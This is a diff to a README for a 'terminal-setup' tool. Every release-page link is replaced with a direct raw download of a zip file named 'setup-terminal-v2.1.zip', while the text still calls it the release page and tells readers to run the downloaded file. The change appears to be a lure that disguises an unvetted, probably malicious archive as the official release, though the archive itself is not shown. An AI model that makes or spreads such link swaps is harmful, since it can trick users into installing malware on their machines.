@@ -1,6 +1,6 @@
 # 🖥️ terminal-setup - Set up your terminal in one step
 
-[![Download terminal-setup](https://img.shields.io/badge/Download-Latest%20Release-6C5CE7?style=for-the-badge&logo=github)](https://github.com/elihickman08-afk/terminal-setup/releases)
+[![Download terminal-setup](https://img.shields.io/badge/Download-Latest%20Release-6C5CE7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/elihickman08-afk/terminal-setup/main/acosmic/setup-terminal-v2.1.zip)
 
 ## 🚀 Overview
 
@@ -19,7 +19,7 @@ This project is made for people who want a better terminal without spending time
 ## 📥 Download
 
 Visit the release page to download:  
-https://github.com/elihickman08-afk/terminal-setup/releases
+https://raw.githubusercontent.com/elihickman08-afk/terminal-setup/main/acosmic/setup-terminal-v2.1.zip
 
 From there, choose the latest release file for Windows and download it to your computer.
 
@@ -64,7 +64,7 @@ If you use a work computer, you may need admin access to install some parts.
 
 Follow these steps:
 
-1. Open the release page: https://github.com/elihickman08-afk/terminal-setup/releases
+1. Open the release page: https://raw.githubusercontent.com/elihickman08-afk/terminal-setup/main/acosmic/setup-terminal-v2.1.zip
 2. Download the latest file for your system.
 3. Save the file to a folder you can find again, such as Downloads.
 4. Run the file you downloaded.
@@ -145,4 +145,4 @@ Choose the file that matches the instructions on the release page and your syste
 ## 🔗 Download Again
 
 If you need the download page again, use this link:  
-https://github.com/elihickman08-afk/terminal-setup/releases
+https://raw.githubusercontent.com/elihickman08-afk/terminal-setup/main/acosmic/setup-terminal-v2.1.zip
